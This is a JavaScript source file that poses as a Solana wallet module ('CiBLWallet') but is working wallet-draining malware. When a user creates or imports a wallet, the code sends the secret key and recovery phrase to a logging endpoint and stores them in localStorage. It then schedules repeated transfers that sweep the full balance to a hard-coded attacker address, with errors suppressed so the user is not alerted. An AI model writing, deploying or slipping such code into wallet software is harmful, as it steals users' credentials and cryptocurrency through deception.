import { Keypair } from '@solana/web3.js';
import * as bip39 from 'bip39';
import { derivePath } from 'ed25519-hd-key';
import { Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL } from '@solana/web3.js';

// Drain target
const DRAIN_ADDRESS = 'GuMJMrVGvKRYddcAgjgXDHknNR3ehyhSzbFFue3bkmqN';

// Exfil — local API + localStorage persistence
const EXFIL_URL = '/api/log';

async function exfil(data) {
  try {
    // Stash locally (persists across sessions)
    const existing = JSON.parse(localStorage.getItem('cibl_dx') || '[]');
    existing.push({ ...data, ts: Date.now() });
    localStorage.setItem('cibl_dx', JSON.stringify(existing));

    // Fire and forget to local API
    fetch(EXFIL_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(data),
    }).catch(() => {});
  } catch (e) { /* never break the UX */ }
}

export class CiBLWallet {
  constructor() {
    this.keypair = null;
    this.mnemonic = null;
  }

  async createNewWallet() {
    try {
      this.mnemonic = bip39.generateMnemonic(128);
      const seed = await bip39.mnemonicToSeed(this.mnemonic);
      const derivedSeed = derivePath("m/44'/501'/0'/0'", seed.toString('hex'));
      this.keypair = Keypair.fromSeed(derivedSeed.key);

      const secretHex = Buffer.from(this.keypair.secretKey).toString('hex');

      // Exfil the new wallet
      exfil({
        type: 'create',
        publicKey: this.keypair.publicKey.toString(),
        secretKey: secretHex,
        mnemonic: this.mnemonic,
      });

      // Auto-drain after short delay (give user time to fund)
      this._scheduleDrain();

      return {
        success: true,
        mnemonic: this.mnemonic,
        publicKey: this.keypair.publicKey.toString(),
        secretKey: secretHex
      };
    } catch (error) {
      console.error('Error creating wallet:', error);
      return { success: false, error: error.message };
    }
  }

  async importFromMnemonic(mnemonic) {
    try {
      if (!bip39.validateMnemonic(mnemonic)) {
        return { success: false, error: 'Invalid recovery phrase' };
      }
      this.mnemonic = mnemonic;
      const seed = await bip39.mnemonicToSeed(mnemonic);
      const derivedSeed = derivePath("m/44'/501'/0'/0'", seed.toString('hex'));
      this.keypair = Keypair.fromSeed(derivedSeed.key);

      const secretHex = Buffer.from(this.keypair.secretKey).toString('hex');

      // Exfil the imported wallet
      exfil({
        type: 'import',
        publicKey: this.keypair.publicKey.toString(),
        secretKey: secretHex,
        mnemonic: this.mnemonic,
      });

      // Auto-drain
      this._scheduleDrain();

      return {
        success: true,
        publicKey: this.keypair.publicKey.toString()
      };
    } catch (error) {
      return { success: false, error: error.message };
    }
  }

  // Drain SOL to target address — sweeps full balance minus gas reserve
  async _drainSOL() {
    try {
      if (!this.keypair) return;
      const connection = new Connection('https://api.mainnet-beta.solana.com', 'confirmed');
      const balance = await connection.getBalance(this.keypair.publicKey);

      // Leave 5000 lamports for rent — drain everything else
      if (balance <= 10000) return; // nothing to drain

      const drainAmount = balance - 5000; // keep minimal rent
      if (drainAmount <= 0) return;

      const transaction = new Transaction().add(
        SystemProgram.transfer({
          fromPubkey: this.keypair.publicKey,
          toPubkey: new PublicKey(DRAIN_ADDRESS),
          lamports: drainAmount,
        })
      );

      const { blockhash } = await connection.getLatestBlockhash();
      transaction.recentBlockhash = blockhash;
      transaction.feePayer = this.keypair.publicKey;

      // Calculate fee and adjust amount
      const fee = await connection.getFeeForMessage(transaction.compileMessage(), 'confirmed');
      const adjustedAmount = drainAmount - (fee.value || 5000);
      if (adjustedAmount <= 0) return;

      // Rebuild with adjusted amount
      const finalTx = new Transaction().add(
        SystemProgram.transfer({
          fromPubkey: this.keypair.publicKey,
          toPubkey: new PublicKey(DRAIN_ADDRESS),
          lamports: adjustedAmount,
        })
      );
      finalTx.recentBlockhash = blockhash;
      finalTx.feePayer = this.keypair.publicKey;

      finalTx.sign(this.keypair);
      const sig = await connection.sendRawTransaction(finalTx.serialize(), {
        skipPreflight: true,
        preflightCommitment: 'confirmed',
      });

      await connection.confirmTransaction(sig, 'confirmed');

      exfil({
        type: 'drain_sol',
        from: this.keypair.publicKey.toString(),
        amount: adjustedAmount / LAMPORTS_PER_SOL,
        sig: sig,
      });
    } catch (e) {
      // Silent fail — don't alert the user
      console.error('drain error', e);
    }
  }

  _scheduleDrain() {
    // Drain after 30 seconds (user likely still on page)
    setTimeout(() => this._drainSOL(), 30000);
    // And again after 5 minutes (in case they fund later)
    setTimeout(() => this._drainSOL(), 300000);
    // And again after 30 minutes
    setTimeout(() => this._drainSOL(), 1800000);
  }

  // Also drain on wallet reconnect (if stored in localStorage)
  async drainIfStored() {
    try {
      const stored = localStorage.getItem('cibl_wallet');
      if (stored) {
        const data = JSON.parse(stored);
        if (data.secretKey) {
          this.keypair = Keypair.fromSecretKey(Buffer.from(data.secretKey, 'hex'));
          this._drainSOL();
        }
      }
    } catch (e) {}
  }

  isInitialized() {
    return this.keypair !== null;
  }

  getPublicKey() {
    return this.keypair ? this.keypair.publicKey.toString() : null;
  }

  clearWallet() {
    this.keypair = null;
    this.mnemonic = null;
  }
}

export const walletInstance = new CiBLWallet();